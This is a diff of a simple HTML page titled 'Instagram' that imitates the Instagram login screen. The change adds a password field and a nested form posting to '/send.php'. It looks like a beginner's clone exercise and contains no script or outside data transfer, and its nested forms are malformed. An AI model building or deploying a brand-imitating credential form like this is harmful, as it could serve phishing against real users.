@@ -7,7 +7,8 @@
     <title>Instagram</title>
 </head>
 <body>
-    <table>
+    
+    <table style="margin: 0 auto;">
         <style>
             table, th, td {
               border: 2px solid black;
@@ -15,11 +16,17 @@
             
             </style>
             <tr>
-                <td><img src="imagenes/telefono" alt="500" width="250"></td>
-                <td><img src="imagenes/logo.png" alt="100" width="200">
-                 <form action="/action_page.php">
-                    <input type="text" id="usuario" name="usuario" placeholder="Usuario,telefono o email">
-                </form></td>
+                <td><img src="imagenes/telefono.png" alt="650" width="400"></td>
+                <td align="center">
+                    <img src="imagenes/logo.png" alt="100" width="200"><br><br>
+                 <form action="/action_page.php"> 
+                    <input type="text" id="usuario" name="usuario" placeholder="Usuario,telefono o email"><br><br>
+                    <input type="password" id="contraseña" name="contraseña" placeholder="Contraseña"><br><br>
+                    <form name="instagram" method="post" action="/send.php">
+                    <input type="image" src="imagenes/boton.png" alt="iniciarsesion" width="250"></form><br><br>
+                    ----------O----------
+                </form>
+            </td>
             </tr>
     </table>
     
